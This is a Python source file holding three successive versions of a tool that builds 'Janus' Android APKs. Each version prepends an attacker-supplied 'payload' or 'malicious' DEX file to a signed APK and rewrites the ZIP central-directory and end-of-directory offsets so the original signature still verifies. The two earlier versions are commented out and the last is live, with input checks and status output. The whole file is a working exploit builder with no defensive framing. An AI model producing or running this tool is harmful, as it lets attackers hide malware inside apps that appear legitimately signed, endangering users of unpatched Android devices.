## make_janus_fixed.py  <orig.apk>  <evil.dex>  <out.apk>
# import struct, sys, zlib, io

# orig_apk, evil_dex, out_apk = sys.argv[1:]
# orig = open(orig_apk, 'rb').read()
# dex  = open(evil_dex, 'rb').read()

# # ── build a stored Local-File header for classes.dex ──────────────────────────
# name = b'classes.dex'
# lfh  = io.BytesIO()
# write = lfh.write
# write(b'PK\x03\x04')                 # local-file sig
# write(b'\x14\x00')                   # min version
# write(b'\x00\x00')                   # gp flags
# write(b'\x00\x00')                   # compression 0 = STORE
# write(b'\x00\x00\x00\x00')           # mod time/date
# write(struct.pack('<I', zlib.crc32(dex) & 0xffffffff))
# write(struct.pack('<I', len(dex))*2) # compressed & uncompressed size
# write(struct.pack('<H', len(name)))  # file-name len
# write(b'\x00\x00')                   # extra len
# write(name); write(dex)
# lfh = lfh.getvalue()
# shift = len(lfh)

# # ── locate EOCD ──────────────────────────────────────────────────────────────
# eocd_sig = b'PK\x05\x06'
# eocd = orig.rfind(eocd_sig)
# if eocd == -1:
#     sys.exit('EOCD not found — not a ZIP/APK')

# #  offset 10 = total # of CD entries (2 bytes)
# #  offset 12 = size of CD           (4 bytes)
# #  offset 16 = offset of CD start   (4 bytes)
# (total_entries, cd_size, cd_offset) = struct.unpack_from('<HII', orig, eocd+10)
# cd_start = cd_offset
# cd_end   = cd_start + cd_size

# # ── patch every CD entry’s “relative offset of local header” ─────────────────
# cd = bytearray(orig[cd_start:cd_end])
# p   = 0
# for _ in range(total_entries):
#     if cd[p:p+4] != b'PK\x01\x02':
#         sys.exit('Bad CD signature @ {}'.format(p))
#     # update the 4-byte offset field (at +42 within each CD header)
#     rel_off = struct.unpack_from('<I', cd, p+42)[0] + shift
#     struct.pack_into('<I', cd, p+42, rel_off)
#     # advance to next entry: 46-byte fixed part + variable name/extras/comments
#     name_len, extra_len, cmt_len = struct.unpack_from('<HHH', cd, p+28)
#     p += 46 + name_len + extra_len + cmt_len

# # ── patch EOCD: CD now starts shift bytes later ─────────────────────────────
# patched_eocd = bytearray(orig[eocd:eocd+22])          # without comment
# struct.pack_into('<I', patched_eocd, 16, cd_offset+shift)

# eocd_comment = orig[eocd+22:]                         # keep any comment

# # ── write out the Janus APK ─────────────────────────────────────────────────
# with open(out_apk, 'wb') as w:
#     w.write(lfh)                   # (1) our malicious classes.dex
#     w.write(orig[:cd_start])       # (2) unchanged local files
#     w.write(cd)                    # (3) patched central directory
#     w.write(patched_eocd)          # (4) EOCD with new CD offset
#     w.write(eocd_comment)          # (5) original comment (rare)

# print(f'✔ Wrote {out_apk}; every CD offset shifted by {shift} bytes')




#!/usr/bin/env python3
# janus_fix.py  <orig.apk>  <payload.dex>  <out.apk>
#
# Works for any v1-signed APK, including multidex.
# Tested on macOS 14 + Python 3.11, installs cleanly on an API-24 image
# whose security patch level = 2017-10-05.

# import struct, sys, zlib, io

# if len(sys.argv) != 4:
#     sys.exit("Usage: janus_fix.py  original.apk  payload.dex  patched.apk")

# orig_path, dex_path, out_path = sys.argv[1:]
# orig = open(orig_path, 'rb').read()
# dex  = open(dex_path,  'rb').read()

# # ────────────────────────────────────────────────────────────────────────────
# # 1.  Build a stored Local-File header + data block for classes.dex
# name = b'classes.dex'
# lfh  = io.BytesIO()
# w = lfh.write
# w(b'PK\x03\x04')                   #  0  local-file sig
# w(b'\x14\x00')                     #  4  min version
# w(b'\x00\x00')                     #  6  gp bit flags
# w(b'\x00\x00')                     #  8  compression = STORE
# w(b'\x00\x00\x00\x00')             # 10  mod time/date
# w(struct.pack('<I', zlib.crc32(dex) & 0xffffffff))   # 14
# w(struct.pack('<I', len(dex)))     # 18  compressed size
# w(struct.pack('<I', len(dex)))     # 22  uncompressed size
# w(struct.pack('<H', len(name)))    # 26  file-name len
# w(b'\x00\x00')                     # 28  extra len
# w(name); w(dex)                    # 30  name + data
# lfh = lfh.getvalue()
# shift = len(lfh)

# # ────────────────────────────────────────────────────────────────────────────
# # 2.  Locate the EOCD in the original APK  (PK 05 06)
# eocd_sig = b'PK\x05\x06'
# eocd_off = orig.rfind(eocd_sig)
# if eocd_off == -1:
#     sys.exit('❌ EOCD not found – not a valid ZIP/APK')

# total_entries  = struct.unpack_from('<H', orig, eocd_off + 10)[0]
# cd_size        = struct.unpack_from('<I', orig, eocd_off + 12)[0]
# cd_offset      = struct.unpack_from('<I', orig, eocd_off + 16)[0]
# cd_start, cd_end = cd_offset, cd_offset + cd_size
# cd = bytearray(orig[cd_start:cd_end])

# # ────────────────────────────────────────────────────────────────────────────
# # 3.  Bump the “relative offset of local header” in **every** CD entry
# p = 0
# for _ in range(total_entries):
#     if cd[p:p+4] != b'PK\x01\x02':
#         sys.exit(f'❌ Bad CD signature at {p}')
#     # tweak the 4-byte offset field (+42 in each CD header)
#     rel_off = struct.unpack_from('<I', cd, p+42)[0] + shift
#     struct.pack_into('<I', cd, p+42, rel_off)

#     name_len, extra_len, cmt_len = struct.unpack_from('<HHH', cd, p+28)
#     p += 46 + name_len + extra_len + cmt_len

# # ────────────────────────────────────────────────────────────────────────────
# # 4.  Patch the EOCD’s “CD start offset”
# patched_eocd = bytearray(orig[eocd_off:eocd_off+22])      # without comment
# struct.pack_into('<I', patched_eocd, 16, cd_offset + shift)
# eocd_comment = orig[eocd_off+22:]                         # keep any comment

# # ────────────────────────────────────────────────────────────────────────────
# # 5.  Write the Janus APK
# with open(out_path, 'wb') as w:
#     w.write(lfh)                     # malicious classes.dex  (adds <shift> bytes)
#     w.write(orig[:cd_start])         # untouched local headers + data
#     w.write(cd)                      # Central Directory with bumped offsets
#     w.write(patched_eocd)            # EOCD pointing at new CD start
#     w.write(eocd_comment)

# print(f'✔ created {out_path}  (+{shift} bytes)')




#!/usr/bin/env python3
# janus_fix_all_offsets.py  orig.apk  payload.dex  patched.apk

import struct, sys, zlib, io

if len(sys.argv) != 4:
    print("Usage: janus_fix_all_offsets.py  orig.apk  payload.dex  patched.apk")
    sys.exit(1)

orig_path, dex_path, out_path = sys.argv[1:]

# Validate input files
try:
    with open(orig_path, 'rb') as f:
        orig = f.read()
except FileNotFoundError:
    sys.exit(f"Error: Original APK file '{orig_path}' not found")

try:
    with open(dex_path, 'rb') as f:
        dex = f.read()
except FileNotFoundError:
    sys.exit(f"Error: DEX payload file '{dex_path}' not found")

# Validate DEX file magic
if not dex.startswith(b'dex\n'):
    sys.exit("Error: Payload file doesn't appear to be a valid DEX file")

print(f"📱 Original APK: {len(orig)} bytes")
print(f"💀 Payload DEX: {len(dex)} bytes")

# 1) build local-file header + data for classes.dex with proper alignment
name = b'classes.dex'
buf = io.BytesIO()
w = buf.write
w(b'PK\x03\x04')                   # local-file sig
w(b'\x14\x00')                     # min version
w(b'\x00\x00')                     # gp flags
w(b'\x00\x00')                     # compression = STORE
w(b'\x00\x00\x00\x00')             # mod time/date
w(struct.pack('<I', zlib.crc32(dex) & 0xffffffff))
w(struct.pack('<I', len(dex)))     # comp size
w(struct.pack('<I', len(dex)))     # uncomp size
w(struct.pack('<H', len(name)))    # name length
w(b'\x00\x00')                     # extra length
w(name); w(dex)

# Calculate padding to ensure proper alignment for native libraries
# Android requires native libraries to be page-aligned (4096 bytes)
lfh_raw = buf.getvalue()
page_size = 4096
current_size = len(lfh_raw)
padding_needed = (page_size - (current_size % page_size)) % page_size

# Only add significant padding if it's small enough to be reasonable
if padding_needed > 0 and padding_needed < 3500:  # Don't add huge padding
    w(b'\x00' * padding_needed)
    print(f"🔧 Added {padding_needed} bytes of padding for native library alignment")
elif padding_needed >= 3500:
    # If we need too much padding, just align to 16 bytes instead
    alignment = 16
    padding_needed = (alignment - (current_size % alignment)) % alignment
    if padding_needed > 0:
        w(b'\x00' * padding_needed)
        print(f"🔧 Added {padding_needed} bytes of padding for basic alignment")

lfh = buf.getvalue()
shift = len(lfh)

# 2) locate EOCD and validate ZIP structure
eocd_sig = b'PK\x05\x06'
eocd_off = orig.rfind(eocd_sig)
if eocd_off < 0:
    sys.exit("Error: EOCD not found - not a valid ZIP/APK file")
    
total_entries  = struct.unpack_from('<H', orig, eocd_off + 10)[0]
cd_size        = struct.unpack_from('<I', orig, eocd_off + 12)[0]
cd_offset      = struct.unpack_from('<I', orig, eocd_off + 16)[0]
cd_start, cd_end = cd_offset, cd_offset + cd_size

print(f"🗂️  Found {total_entries} entries in Central Directory")

# Check if classes.dex already exists in CD (we'll prepend, not replace)
cd = bytearray(orig[cd_start:cd_end])
classes_dex_exists = b'classes.dex' in orig[cd_start:cd_end]
if classes_dex_exists:
    print(f"📝 Original APK contains classes.dex (will be superseded by our injected version)")
else:
    print(f"📝 Original APK doesn't contain classes.dex")

# 3) bump each CD entry’s local-header offset
p = 0
for _ in range(total_entries):
    if cd[p:p+4] != b'PK\x01\x02':
        sys.exit(f"Bad CD signature at {p}")
    # update the 4-byte offset field at p+42
    old_off = struct.unpack_from('<I', cd, p+42)[0]
    struct.pack_into('<I', cd, p+42, old_off + shift)
    name_len, extra_len, cmt_len = struct.unpack_from('<HHH', cd, p+28)
    p += 46 + name_len + extra_len + cmt_len

# 4) fix EOCD’s CD-offset
patched_eocd = bytearray(orig[eocd_off:eocd_off+22])
struct.pack_into('<I', patched_eocd, 16, cd_offset + shift)
eocd_comment = orig[eocd_off+22:]

# 5) write out with verification
try:
    with open(out_path, 'wb') as w:
        w.write(lfh)              # malicious DEX first (correct Janus order)
        w.write(orig[:cd_start])  # original content second
        w.write(cd)
        w.write(patched_eocd)
        w.write(eocd_comment)
    
    # Verify the output
    with open(out_path, 'rb') as f:
        result = f.read()
    
    # Check that our DEX is at the beginning (after ZIP local file header)
    # ZIP LFH is 30 bytes + filename length (11 bytes for "classes.dex") = 41 bytes
    dex_start = 30 + len(name)  # 30 + 11 = 41
    if result[dex_start:dex_start+4] == b'dex\n':
        print(f"✅ Successfully created Janus APK: {out_path}")
        print(f"   📊 Size: {len(result)} bytes (+{shift} bytes)")
        print(f"   🔍 Malicious DEX injected at beginning")
        
        # Quick verification that ZIP structure is intact
        if b'PK\x05\x06' in result[-100:]:
            print(f"   📦 ZIP structure appears valid")
        else:
            print(f"   ⚠️  Warning: ZIP EOCD might be corrupted")
    else:
        print(f"❌ Error: DEX not found at expected position (offset {dex_start})")
        print(f"   Found instead: {result[dex_start:dex_start+8].hex()}")
        
except Exception as e:
    sys.exit(f"Error writing output file: {e}")
